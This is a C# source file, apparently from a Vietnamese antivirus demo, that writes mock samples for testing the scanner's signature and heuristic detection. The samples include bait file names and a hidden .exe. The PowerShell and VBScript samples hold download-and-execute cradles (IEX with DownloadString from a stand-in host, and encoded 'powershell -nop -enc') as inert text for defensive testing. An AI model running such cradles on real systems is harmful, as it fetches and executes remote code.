using System;
using System.Collections.Generic;
using System.IO;

namespace ScanAndRemoveVirus.Services
{
    /// <summary>
    /// Bộ "virus mock" chính chủ: 11 tệp VÔ HẠI tái hiện đầy đủ 3 kỹ thuật phát hiện
    /// (8 đe dọa + 3 đối chứng sạch). Vị trí CHUẨN: thư mục Samples\ ngay trong project
    /// (repo đã gồm sẵn file; tìm từ thư mục exe đi lên). Nếu app chạy
    /// ngoài repo -> fallback tạo ở Desktop\XVirus-Samples. Create() (nút "Tạo tệp mẫu")
    /// chỉ phục hồi/ghi đè nội dung — idempotent.
    /// </summary>
    public static class TestSamples
    {
        public const string SignatureSampleName = "mau-ky-hieu.txt";            // KT1: prefix
        public const string HashSampleName = "mau-hash-sha256.txt";              // KT1: hash bảng chữ ký
        public const string EicarNameSample = "demo_eicar_named.dat";            // KT1: luật tên chứa "eicar"
        public const string SpoofSampleName = "thong-bao-hoa-don-invoice.pdf.exe"; // KT2: đuôi kép + mồi câu
        public const string ScriptSampleName = "update-flash.ps1";               // KT2: marker PowerShell độc
        // ---- Bộ mở rộng: phủ nốt các vector heuristic/chữ ký chưa có mẫu đối chứng ----
        public const string HiddenExeName = "thong-bao-crack-hidden.exe";        // KT2: exe ẩn + tên mồi câu (40+30=70)
        public const string VbsSampleName = "downloader-tien-ich.vbs";           // KT2: 3 marker script (iex+base64+download)
        public const string JsPrefixName = "hook-tien-ich.js";                   // KT1: prefix chữ ký ở byte 0 qua đuôi .js
        public const string CrackedExeName = "keygen-pro.exe";                   // đối chứng: mồi câu đơn lẻ 30/100 DƯỚI ngưỡng
        public const string CleanScriptName = "script-sach.ps1";                 // đối chứng: script lành KHÔNG được báo
        public const string BenignSampleName = "README-mau.txt";                 // đối chứng: KHÔNG được báo

        private static string cachedFolder;

        public static string FolderPath
        {
            get
            {
                if (cachedFolder != null) return cachedFolder;
                // Tìm Samples\ gần nhất bằng cách leo lên từ thư mục exe
                // (bin\Debug -> project -> repo Samples; fallback Desktop khi chạy ngoài repo)
                var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
                for (int hop = 0; hop < 7 && dir != null; hop++, dir = dir.Parent)
                {
                    string cand = Path.Combine(dir.FullName, "Samples");
                    if (Directory.Exists(cand)) { cachedFolder = cand; return cand; }
                }
                cachedFolder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "XVirus-Samples");
                return cachedFolder;
            }
        }

        /// <summary>Tạo (đè nếu tồn tại) bộ mẫu; trả về danh sách đường dẫn. Idempotent.</summary>
        public static List<string> Create()
        {
            Directory.CreateDirectory(FolderPath);
            var made = new List<string>();
            made.Add(Write(SignatureSampleName,
                ScanEngine.TestSignature + "day-la-mau-gia-lap-vo-hai"));
            made.Add(Write(HashSampleName, ScanEngine.SignatureSampleContent));
            made.Add(Write(EicarNameSample, "Ten trung chuan EICAR chi de duoc phat hian theo ten."));
            made.Add(Write(SpoofSampleName, "Khong phai PE that - chi-la-mau-duoi-kep."));
            made.Add(Write(ScriptSampleName,
                "$ErrorActionPreference='SilentlyContinue';"
                + "IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/p');"
                + " $e=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQ=='));"
                + " powershell -nop -enc TQ=="));
            // KT2: exe ẩn (+40) + tên mồi câu "crack" (+30) = 70 ≥ 60 ngưỡng heuristic
            made.Add(Write(HiddenExeName, "Khong phai PE that - mau exe-an-moi-cau."));
            File.SetAttributes(Path.Combine(FolderPath, HiddenExeName), FileAttributes.Hidden);
            // KT2: script .vbs chứa 3 marker độc điển hình (iex + download + base64) = 90/100.
            // Marker so trên text đã lowercase — viết hoa thế nào cũng khớp.
            made.Add(Write(VbsSampleName,
                "' mo phong PowerShell: IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/x')\r\n"
                + "' gia ma: FromBase64String('QQ==') roi thuc thi\r\n"
                + "WScript.Echo \"mau vbs vo hai - chi la text\""));
            // KT1: chữ ký prefix phải nằm ở BYTE 0 — CheckContent chỉ soi 22 byte đầu tệp
            made.Add(Write(JsPrefixName, ScanEngine.TestSignature + "javascript-sig-mock"));
            // Đối chứng: mồi câu đơn lẻ +30 — heuristic KHÔNG được báo nhầm tên đẹp
            made.Add(Write(CrackedExeName, "Khong phai PE that - mau moi cau duoi nguong."));
            // Đối chứng: script lành thật sự (dọn file tmp), không marker nào -> không được báo
            made.Add(Write(CleanScriptName,
                "# script-sach: don dep file tam\r\n"
                + "Get-ChildItem $env:TEMP -Filter '*.log' | Remove-Item -Confirm:$false\r\n"));
            made.Add(Write(BenignSampleName,
                "Day la tep doi chung SACH: quyet ca thu muc nay chi duoc phép báo ĐÚNG 8 tep mau tren."));
            return made;
        }

        private static string Write(string name, string content)
        {
            string path = Path.Combine(FolderPath, name);
            // Windows chặn ghi đè tệp có attribute Hidden/ReadOnly -> gỡ trước,
            // mẫu cần ẩn (HiddenExeName) sẽ được đặt lại Hidden ngay sau khi ghi.
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Normal);
            File.WriteAllText(path, content);
            return path;
        }
    }
}
